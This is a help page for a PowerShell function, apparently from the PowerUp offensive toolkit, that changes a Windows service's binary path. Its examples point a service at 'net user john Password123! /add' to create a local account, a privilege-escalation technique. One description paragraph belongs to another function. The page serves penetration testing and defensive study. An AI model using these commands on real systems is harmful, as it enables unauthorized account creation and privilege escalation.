# Set-ServiceBinaryPath

## SYNOPSIS
Sets the binary path for a service to a specified value.

Author: Will Schroeder (@harmj0y), Matthew Graeber (@mattifestation)  
License: BSD 3-Clause  
Required Dependencies: PSReflect

## SYNTAX

```
Set-ServiceBinaryPath [-Name] <String[]> [-Path] <String>
```

## DESCRIPTION
Takes a service Name or a ServiceProcess.ServiceController on the pipeline and first opens up a
service handle to the service with ConfigControl access using the GetServiceHandle
Win32 API call.
ChangeServiceConfig is then used to set the binary path (lpBinaryPathName/binPath)
to the string value specified by binPath, and the handle is closed off.

Takes one or more ServiceProcess.ServiceController objects on the pipeline and adds a
Dacl field to each object.
It does this by opening a handle with ReadControl for the
service with using the GetServiceHandle Win32 API call and then uses
QueryServiceObjectSecurity to retrieve a copy of the security descriptor for the service.

## EXAMPLES

### -------------------------- EXAMPLE 1 --------------------------
```
Set-ServiceBinaryPath -Name VulnSvc -Path 'net user john Password123! /add'
```

Sets the binary path for 'VulnSvc' to be a command to add a user.

### -------------------------- EXAMPLE 2 --------------------------
```
Get-Service VulnSvc | Set-ServiceBinaryPath -Path 'net user john Password123! /add'
```

Sets the binary path for 'VulnSvc' to be a command to add a user.

## PARAMETERS

### -Name
An array of one or more service names to set the binary path for.
Required.

```yaml
Type: String[]
Parameter Sets: (All)
Aliases: ServiceName

Required: True
Position: 1
Default value: None
Accept pipeline input: True (ByPropertyName, ByValue)
Accept wildcard characters: False
```

### -Path
The new binary path (lpBinaryPathName) to set for the specified service.
Required.

```yaml
Type: String
Parameter Sets: (All)
Aliases: BinaryPath, binPath

Required: True
Position: 2
Default value: None
Accept pipeline input: False
Accept wildcard characters: False
```

## INPUTS

## OUTPUTS

### System.Boolean

$True if configuration succeeds, $False otherwise.

## NOTES

## RELATED LINKS

[https://msdn.microsoft.com/en-us/library/windows/desktop/ms681987(v=vs.85).aspx](https://msdn.microsoft.com/en-us/library/windows/desktop/ms681987(v=vs.85).aspx)

